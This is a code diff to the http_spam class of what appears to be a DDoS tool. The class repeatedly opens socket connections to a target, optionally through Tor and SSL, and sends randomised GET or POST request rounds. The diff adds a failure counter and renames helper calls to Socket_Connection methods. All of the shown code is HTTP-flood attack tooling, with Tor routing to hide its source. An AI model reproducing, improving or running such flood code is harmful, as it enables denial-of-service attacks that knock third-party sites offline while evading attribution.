@@ -33,6 +33,7 @@ class http_spam(DDoS_Class):
         self.method = method
         self.stop = False
         self.counter = 0
+        self.fails=0
         self.start = time.time()
         self.target = u
         self.duration = duration
@@ -67,11 +68,11 @@ class http_spam(DDoS_Class):
                     break
                 try:
                     if self.tor==True:
-                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                     else:
-                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_socket_connection(self.target,self.port,timeout=self.timeout)
                     if self.port==443 or self.ssl_on==True:
-                        s=wrap_socket_with_ssl(s,self.target)
+                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                     for l in range(random.randint(self.round_min, self.round_max)):
                         if self.method == 3:
                             ty = random.randint(1, 2)
@@ -81,7 +82,7 @@ class http_spam(DDoS_Class):
                             req = "GET"
                         else:
                             req = "POST"
-                        m = setup_http_packet(
+                        m = Socket_Connection.setup_http_packet(
                             self.target,
                             ty,
                             self.paths,
@@ -108,11 +109,12 @@ class http_spam(DDoS_Class):
                             time.sleep(self.interval)
                         except Exception as ex:
                             #print(ex)
+                            self.fails+=1
                             break
                         time.sleep(self.interval)
                     s.close()
                 except:
-                    pass
+                    self.fails+=1
                 time.sleep(0.1)
             self.kill()
         except:
